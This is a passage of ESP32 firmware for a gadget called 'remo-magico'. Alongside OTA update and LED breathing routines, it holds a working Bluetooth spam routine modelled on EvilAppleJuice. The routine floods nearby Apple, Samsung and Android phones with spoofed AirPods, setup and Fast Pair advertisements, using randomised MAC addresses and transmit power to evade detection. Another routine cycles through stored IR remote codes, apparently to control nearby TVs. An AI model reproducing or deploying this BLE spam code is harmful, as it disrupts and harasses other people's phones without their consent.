  Serial.println("Configuring WiFi AP settings...");
  WiFi.softAPConfig(
    IPAddress(192, 168, 4, 1),  // AP IP
    IPAddress(192, 168, 4, 1),  // Gateway
    IPAddress(255, 255, 255, 0) // Subnet mask
  );
  
  Serial.println("Starting WiFi AP...");
  // Use more conservative settings for ESP32-C3
  bool apStarted = WiFi.softAP(OTA_SSID, OTA_PASSWORD, 1, 0, 1); // Channel 1, not hidden, max 1 connection for stability
  
  if (!apStarted) {
    Serial.println("Failed to start WiFi AP! Retrying once...");
    delay(1000);
    apStarted = WiFi.softAP(OTA_SSID, OTA_PASSWORD, 6, 0, 1); // Try different channel with 1 connection
    
    if (!apStarted) {
      Serial.println("Failed to start WiFi AP after retry! Continuing without OTA...");
      // Disable WiFi completely to save power and prevent issues
      WiFi.mode(WIFI_OFF);
      return;
    }
  }
  
  delay(1000); // Give AP more time to stabilize
  
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);
  
  // Verify AP is actually working
  if (IP == IPAddress(0, 0, 0, 0)) {
    Serial.println("AP IP is invalid! OTA setup failed.");
    WiFi.mode(WIFI_OFF);
    return;
  }
  
  Serial.println("Setting up OTA handlers...");
  
  ArduinoOTA.setHostname("remo-magico");
  ArduinoOTA.setPassword(OTA_PASSWORD); // Add password protection
  
  ArduinoOTA.onStart([]() {
    String type;
    if (ArduinoOTA.getCommand() == U_FLASH) {
      type = "sketch";
    } else { // U_SPIFFS
      type = "filesystem";
    }
    Serial.println("Start updating " + type);
    
    // Stop all background activities during OTA
    breathingActive = false;
    currentState = STATE_IDLE;
    
    // Disable hardware timer completely during OTA
    if (timer) {
      timerAlarmDisable(timer);
      timerDetachInterrupt(timer);
      timerEnd(timer);
      timer = NULL;
    }
    
    // Turn off all LEDs to save power
    digitalWrite(LED1_PIN, HIGH);
    digitalWrite(LED2_PIN, HIGH);
    digitalWrite(LED3_PIN, HIGH);
    digitalWrite(DEBUG_LED_PIN, LOW);
    
    // Disable watchdog during OTA to prevent timeout
    esp_task_wdt_delete(NULL);
    
    Serial.println("All peripherals stopped for OTA");
  });
  
  ArduinoOTA.onEnd([]() {
    Serial.println("\nOTA End! Rebooting...");
  });
  
  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    Serial.printf("Progress: %u%%\r", (progress / (total / 100)));
  });
  
  ArduinoOTA.onError([](ota_error_t error) {
    Serial.printf("Error[%u]: ", error);
    if (error == OTA_AUTH_ERROR) Serial.println("Auth Failed");
    else if (error == OTA_BEGIN_ERROR) Serial.println("Begin Failed");
    else if (error == OTA_CONNECT_ERROR) Serial.println("Connect Failed");
    else if (error == OTA_RECEIVE_ERROR) Serial.println("Receive Failed");
    else if (error == OTA_END_ERROR) Serial.println("End Failed");
    
    Serial.println("OTA failed, restarting device...");
    // Don't try to restart timer, just reboot the device
    delay(1000);
    ESP.restart();
  });

  Serial.println("Starting OTA service...");
  try {
    ArduinoOTA.begin();
    Serial.println("OTA Ready. Connect to WiFi AP: " + String(OTA_SSID));
    Serial.println("Password: " + String(OTA_PASSWORD));
    Serial.println("Then go to: http://" + IP.toString() + " for OTA updates");
    Serial.println("OTA setup completed successfully!");
  } catch (...) {
    Serial.println("Exception during OTA begin! Disabling WiFi...");
    WiFi.mode(WIFI_OFF);
  }
}


/**
 * @brief Hardware timer interrupt handler for smooth LED PWM
 */
void IRAM_ATTR onTimer() {
  portENTER_CRITICAL_ISR(&timerMux);
  
  if (breathingActive) {
    // Increment PWM counter (0-99 for 100 steps)
    pwmCounter = (pwmCounter + 1) % 100;
    
    // For active-low LEDs: HIGH = off, LOW = on
    bool shouldBeOn = pwmCounter < currentBrightness;
    
    // Apply the same breathing effect to all three LEDs
    digitalWrite(LED1_PIN, shouldBeOn ? LOW : HIGH);
    digitalWrite(LED2_PIN, shouldBeOn ? LOW : HIGH);
    digitalWrite(LED3_PIN, shouldBeOn ? LOW : HIGH);
  }
  
  portEXIT_CRITICAL_ISR(&timerMux);
}

/**
 * @brief Setup hardware timer for LED PWM
 */
void setupTimer() {
  // Create timer with 80MHz clock (1µs resolution)
  timer = timerBegin(0, 80, true);
  
  // Attach timer interrupt
  timerAttachInterrupt(timer, &onTimer, true);
  
  // Set timer to trigger every 200µs (5kHz PWM frequency)
  timerAlarmWrite(timer, 200, true);
  
  // Enable timer
  timerAlarmEnable(timer);
  
  Serial.println("Hardware timer setup complete - 5kHz PWM frequency");
}

/**
 * @brief Calculates breathing brightness values (called from main loop)
 */
void handleMagicalGlow() {
  static unsigned long lastUpdate = 0;
  
  unsigned long now = millis();
  
  // Update brightness calculation every 10ms
  if (now - lastUpdate >= 10) {
    lastUpdate = now;
    
    if (breathingActive) {
      // Calculate time elapsed since breathing started
      unsigned long elapsedTime = now - breathingStartTime;
      
      // Base breathing period starts at 4 seconds, accelerates to 0.5 seconds over 10 seconds
      float accelerationFactor = min(elapsedTime / 10000.0f, 1.0f); // 0 to 1 over 10 seconds
      float breathingPeriod = 4000.0f - (3500.0f * accelerationFactor); // 4000ms to 500ms
      
      // Calculate breathing phase (0 to 2π for one complete breath cycle)
      float phase = (2.0f * PI * (now % (unsigned long)breathingPeriod)) / breathingPeriod;
      
      // Calculate brightness using sine wave for smooth breathing
      float sineValue = sin(phase);
      
      // Critical section to update brightness value
      portENTER_CRITICAL(&timerMux);
      currentBrightness = (int)((sineValue + 1.0f) * 50.0f); // Maps -1,1 to 0,100
      portEXIT_CRITICAL(&timerMux);
    } else {
      // Turn off LEDs when not breathing
      portENTER_CRITICAL(&timerMux);
      currentBrightness = 0;
      portEXIT_CRITICAL(&timerMux);
    }
  }
}

/**
 * @brief Sends the next IR code from the global command list.
 */
void sendNextIrCode() {
  const IRCommand& cmd = irCommands[currentCommandIndex];

  // Use a switch to call the correct function from the IRremoteESP8266 library
  switch (cmd.protocol) {
    case SAMSUNG:
      irsend.sendSAMSUNG(cmd.code, cmd.bits);
      break;
    case NEC:
      irsend.sendNEC(cmd.code, cmd.bits);
      break;
    case SONY:
      irsend.sendSony(cmd.code, cmd.bits);
      break;
    case RC6:
      irsend.sendRC6(cmd.code, cmd.bits);
      break;
    case SHARP:
      irsend.sendSharpRaw(cmd.code, cmd.bits); // Using sendSharpRaw is more reliable
      break;
    default:
      // Fallback to NEC for unknown protocols
      irsend.sendNEC(cmd.code, cmd.bits);
      break;
  }
  
  //Serial.printf("Sent command %d, protocol %d, code 0x%llX\n", currentCommandIndex, cmd.protocol, cmd.code);

  // Increment and wrap the index to loop through all commands
  currentCommandIndex = (currentCommandIndex + 1) % numCommands;
}

// ######################################################################
// ##                    BLUETOOTH SPOOFING FUNCTIONS                  ##
// ######################################################################

/**
 * @brief Initialize Bluetooth Low Energy for device spam (EvilAppleJuice-ESP32 method)
 */
void setupBLE() {
  Serial.println("Initializing BLE for Apple/Samsung/Android spam (EvilAppleJuice-ESP32 method)...");
  
  try {
    // Initialize BLE device with fake AirPods name for maximum effectiveness
    BLEDevice::init("AirPods 69");
    
    // Set maximum TX power for ESP32-C3
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    // Create the BLE Server
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    
    if (pAdvertising) {
      // Initialize with a random address like EvilAppleJuice-ESP32
      esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
      pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
      
      bleInitialized = true;
      Serial.println("BLE initialized successfully (spam will start on button press)");
    } else {
      Serial.println("Failed to get BLE advertising handle");
      bleInitialized = false;
    }
    
  } catch (...) {
    Serial.println("Exception during BLE initialization");
    bleInitialized = false;
  }
}

/**
 * @brief Cycle through BLE spam packets (EvilAppleJuice-ESP32 method)
 */
void cycleBLEDevice() {
  if (!bleInitialized || !pAdvertising) {
    return;
  }
  
  try {
    // Stop current advertising
    pAdvertising->stop();
    
    // Generate fake random MAC address like EvilAppleJuice-ESP32
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      
      // First 4 bits need to be high (0b1111) for proper MAC format
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }
    
    // Set the random MAC address
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    
    // Randomly pick data from one of the device types
    // 0 = Apple headphones, 1 = Apple setup, 2 = Samsung devices, 3 = Android Fast Pair
    int device_choice = random(4);
    String deviceName = "";
    
    if (device_choice == 0) {
      // Use Apple headphones packets
      int index = random(NUM_APPLE_DEVICES);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)APPLE_DEVICES[index], 31));
        #else
          oAdvertisementData.addData(std::string((char*)APPLE_DEVICES[index], 31));
        #endif
      #endif
      deviceName = "Apple Audio " + String(index);
    } else if (device_choice == 1) {
      // Use Apple setup devices packets  
      int index = random(NUM_APPLE_SETUP_DEVICES);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)APPLE_SETUP_DEVICES[index], 23));
        #else
          oAdvertisementData.addData(std::string((char*)APPLE_SETUP_DEVICES[index], 23));
        #endif
      #endif
      deviceName = "Apple Setup " + String(index);
    } else if (device_choice == 2) {
      // Use Samsung Galaxy Buds packets for Samsung phones
      int index = random(NUM_SAMSUNG_DEVICES);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)SAMSUNG_DEVICES[index], 31));
        #else
          oAdvertisementData.addData(std::string((char*)SAMSUNG_DEVICES[index], 31));
        #endif
      #endif
      deviceName = "Samsung Galaxy " + String(index);
    } else {
      // Use Android Fast Pair packets for Samsung and other Android phones
      int index = random(NUM_ANDROID_DEVICES);
      #ifdef ESP_ARDUINO_VERSION_MAJOR
        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)ANDROID_DEVICES[index], 31));
        #else
          oAdvertisementData.addData(std::string((char*)ANDROID_DEVICES[index], 31));
        #endif
      #endif
      deviceName = "Android FastPair " + String(index);
    }
    
    // Randomly use different advertising PDU types (like EvilAppleJuice-ESP32)
    // This increases detectability of spoofed packets and effectiveness
    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }
    
    // Set advertisement data
    pAdvertising->setAdvertisementData(oAdvertisementData);
    
    // Use Apple's recommended 20ms interval for maximum discovery probability
    // (Sometimes disabled for even more aggressive spamming)
    // pAdvertising->setMinInterval(0x20);
    // pAdvertising->setMaxInterval(0x20);
    
    // Start advertising
    pAdvertising->start();
    
    Serial.print("� BLE SPAM: ");
    Serial.println(deviceName);
    
    // Random signal strength like EvilAppleJuice-ESP32 for better stealth
    int rand_val = random(100);
    if (rand_val < 70) {  // 70% probability - max power
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    } else if (rand_val < 85) {  // 15% probability - slightly lower
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
    } else if (rand_val < 95) {  // 10% probability - moderate
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
    } else if (rand_val < 99) {  // 4% probability - low
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
    } else {  // 1% probability - very low
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
    }
    
  } catch (...) {
    Serial.println("Exception during BLE spam cycling");
  }
}

/**
 * @brief Handle BLE device spoofing timing and cycling
 */
void handleBLESpoofing() {
  // Only run BLE spam when device is in active state
  if (!bleInitialized || (currentState == STATE_IDLE)) {
    return;
  }
  
  unsigned long now = millis();
  
  // Change spam packet very quickly like Flipper Zero
  if (now - lastBLESpoofTime >= BLE_SPOOF_INTERVAL_MS) {
    cycleBLEDevice();
    lastBLESpoofTime = now;
  }
}

// ######################################################################
// ##                    FLASH OPTIMIZATION FUNCTIONS                  ##
// ######################################################################

/**
 * @brief Print detailed flash and partition information
 */
void printFlashInfo() {
  Serial.println("\n=== FLASH MEMORY ANALYSIS ===");
  
  // Get flash chip info
  uint32_t flashSize = ESP.getFlashChipSize();
  Serial.print("Flash chip size: ");
  Serial.print(flashSize);
  Serial.println(" bytes");
  
  // Get sketch info
  uint32_t sketchSize = ESP.getSketchSize();
  uint32_t freeSketchSpace = ESP.getFreeSketchSpace();
  Serial.print("Current sketch size: ");
  Serial.print(sketchSize);
  Serial.println(" bytes");
  Serial.print("Free sketch space: ");
  Serial.print(freeSketchSpace);
  Serial.println(" bytes");
  
  // Calculate usage percentage
  float usagePercent = (float)sketchSize / (float)(sketchSize + freeSketchSpace) * 100.0;
  Serial.print("Flash usage: ");
  Serial.print(usagePercent, 1);
  Serial.println("%");
  
  // Get partition info
  const esp_partition_t* running = esp_ota_get_running_partition();
  const esp_partition_t* update = esp_ota_get_next_update_partition(NULL);
  
  if (running) {
    Serial.print("Running partition: ");
    Serial.print(running->label);
    Serial.print(" (size: ");
    Serial.print(running->size);
    Serial.println(" bytes)");
  }
  
  if (update) {
    Serial.print("Update partition: ");
    Serial.print(update->label);
    Serial.print(" (size: ");
    Serial.print(update->size);
    Serial.println(" bytes)");
  }
  
  Serial.println("=============================\n");
}

/**
 * @brief Optimized OTA setup with minimal overhead
 */
void optimizedOTASetup() {
  Serial.println("Setting up OPTIMIZED OTA Access Point...");
  
  // Check if we have enough space for OTA
  uint32_t freeSpace = ESP.getFreeSketchSpace();
  uint32_t sketchSize = ESP.getSketchSize();
  
  if (freeSpace < sketchSize) {
    Serial.println("WARNING: Insufficient flash space for safe OTA!");
    Serial.print("Current sketch: ");
    Serial.print(sketchSize);
    Serial.print(" bytes, Free space: ");
    Serial.print(freeSpace);
    Serial.println(" bytes");
    Serial.println("OTA may fail or brick the device!");
  }
  
  // Add safety check to prevent infinite setup loops
  static bool otaSetupAttempted = false;
  if (otaSetupAttempted) {
    Serial.println("OTA setup already attempted, skipping to prevent bootloop");
    return;
  }
  otaSetupAttempted = true;
  
  // Minimal WiFi setup for reduced memory usage
  Serial.println("Configuring minimal WiFi AP...");
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_AP);
  delay(100);
  
  // Use minimal AP configuration
  if (!WiFi.softAP(OTA_SSID, OTA_PASSWORD, 1, 0, 1)) {
    Serial.println("Failed to start WiFi AP!");
    WiFi.mode(WIFI_OFF);
    return;
  }
  
  IPAddress IP = WiFi.softAPIP();
  Serial.print("OTA AP IP: ");
  Serial.println(IP);
  
  // Configure OTA with minimal settings
  ArduinoOTA.setHostname("remo-magico");
  ArduinoOTA.setPassword(OTA_PASSWORD);
  
  // Optimized OTA callbacks
  ArduinoOTA.onStart([]() {
    Serial.println("OTA Start - CRITICAL: Do not power off!");
    
    // Stop ALL activities immediately
    breathingActive = false;
    currentState = STATE_IDLE;
    
    // Disable timer to free memory
    if (timer) {
      timerAlarmDisable(timer);
      timerDetachInterrupt(timer);
      timerEnd(timer);
      timer = NULL;
    }
    
    // Stop BLE to free memory
    if (bleInitialized && pAdvertising) {
      pAdvertising->stop();
      BLEDevice::deinit(false);
      bleInitialized = false;
    }
    
    // Turn off all peripherals
    digitalWrite(LED1_PIN, HIGH);
    digitalWrite(LED2_PIN, HIGH);
    digitalWrite(LED3_PIN, HIGH);
    digitalWrite(DEBUG_LED_PIN, LOW);
    
    // Disable watchdog
    esp_task_wdt_delete(NULL);
    
    Serial.println("System prepared for OTA update");
  });
  
  ArduinoOTA.onEnd([]() {
    Serial.println("OTA Complete! Rebooting...");
  });
  
  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    static unsigned long lastPrint = 0;
    unsigned long now = millis();
    // Print progress less frequently to reduce overhead
    if (now - lastPrint > 1000) {
      Serial.printf("OTA Progress: %u%%\n", (progress / (total / 100)));
      lastPrint = now;
    }
  });
  
  ArduinoOTA.onError([](ota_error_t error) {
    Serial.printf("OTA Error[%u]: ", error);
    if (error == OTA_AUTH_ERROR) Serial.println("Auth Failed");
    else if (error == OTA_BEGIN_ERROR) Serial.println("Begin Failed");
    else if (error == OTA_CONNECT_ERROR) Serial.println("Connect Failed");
    else if (error == OTA_RECEIVE_ERROR) Serial.println("Receive Failed");
    else if (error == OTA_END_ERROR) Serial.println("End Failed");
    
    Serial.println("OTA failed - rebooting to recover...");
    delay(1000);
    ESP.restart();
  });
  
  try {
    ArduinoOTA.begin();
    Serial.println("Optimized OTA ready!");
    Serial.println("Connect to: " + String(OTA_SSID));
    Serial.println("Password: " + String(OTA_PASSWORD));
    Serial.println("Upload via: " + IP.toString());
  } catch (...) {
    Serial.println("OTA begin failed!");
    WiFi.mode(WIFI_OFF);
  }
}